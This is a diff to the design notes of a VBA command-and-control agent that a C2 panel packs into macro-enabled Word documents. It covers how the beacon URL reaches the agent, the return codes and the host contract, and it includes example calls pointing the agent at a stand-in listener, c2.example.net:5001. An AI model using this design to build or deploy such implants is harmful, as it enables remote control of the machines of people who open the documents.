@@ -26,39 +26,44 @@ breed. No typelib references, no host customization: one `kernel32` declare
 
 ---
 
-## Environment contract
+## Beacon URL contract
 
-| Variable | Meaning |
-|---|---|
-| `H_URL` | The bare beacon origin, e.g. `http://c2.example.net:5001` |
+The module carries **no baked config**. The beacon URL — the bare listener
+origin, e.g. `http://c2.example.net:5001` — arrives on two channels, in
+priority order:
 
-That is the entire configuration surface. The module carries **no baked
-config**: unset `H_URL` → `RunAgent()` returns `"fail"` immediately and
-silently (the log is inert before identity exists — exactly how the
-siblings behave). The host master sets it in the process environment before
-calling in:
+1. **The call argument** — the host master's channel:
+   `result = RunAgent("http://c2.example.net:5001")`.
+2. **The `H_URL` environment variable** — fallback, and only a var the
+   host process **inherited at start** (`set H_URL=...` before launching
+   the Office binary). VBA `Environ` reads the environment block as it
+   existed when the VBA runtime initialized; a var written at RUN time into
+   the same process (`WScript.Shell.Environment("Process")`,
+   `SetEnvironmentVariable`) is **invisible** to it — which is why the URL
+   rides the call.
 
-```vba
-CreateObject("WScript.Shell").Environment("Process")("H_URL") = "http://c2.example.net:5001"
-result = RunAgent()   ' "exit" | "fail" | "busy"
-```
+With neither channel carrying a URL, `RunAgent` returns `"fail"`
+immediately and silently (the log is inert before identity exists — exactly
+how the siblings behave).
 
 ## Host contract
 
 The module defines exactly **one public symbol** — `Public Function
-RunAgent() As String`. Everything else is `Private`. The module name is
+RunAgent(Optional ByVal beaconUrl As String = "") As String`. Everything
+else is `Private`. The module name is
 `C2Agent`.
 
 | Return | Meaning |
 |---|---|
 | `"exit"` | The C2 sent `0x0A`; the run ended cleanly (Exit gets no reply). |
-| `"fail"` | The beacon failed — no `H_URL`, transport dead, non-200 answer. Failure is **fatal**: one cycle, no retry. The caller decides what a dead beacon means. |
+| `"fail"` | The beacon failed — no beacon URL on either channel, transport dead, non-200 answer. Failure is **fatal**: one cycle, no retry. The caller decides what a dead beacon means. |
 | `"busy"` | `RunAgent` was re-entered while a loop is already running. |
 
 **The host owns everything outside the module.** The agent never touches
 windows, processes, persistence or documents — that is the host master's
-job. The only process-global side effects are the two environment reads and
-the module's own state.
+job. The only process-global side effect is the inherited `H_URL` read
+(the call argument is not a process-global at all) plus the module's own
+state.
 
 Two host-coupling notes:
 
@@ -133,9 +138,11 @@ breed must derive the SAME id or one machine mints two agent rows:
    fallback. Never a zero GUID: that is a valid-*shaped* value that would
    key one shared phantom row for every machine where detection failed.
 
-> The panel currently displays this breed as `Unknown (6)` until it learns
-> breed 6 — no C2-side integration is claimed here. The wire is already
-> correct for it.
+> The C2 panel knows this breed end to end: the bundled `VBA-Agent` row
+> (tagged `vba`) in its Agents table, `GetVbaAgentAsync` fetching this file
+> at generation time, and the DOCX panel's **VBA Agent** tab packing it
+> verbatim into a two-module `.docm` behind a ThisDocument host master (the
+> panel's `docs/16` tells the C2 side).
 
 ## Commands
 
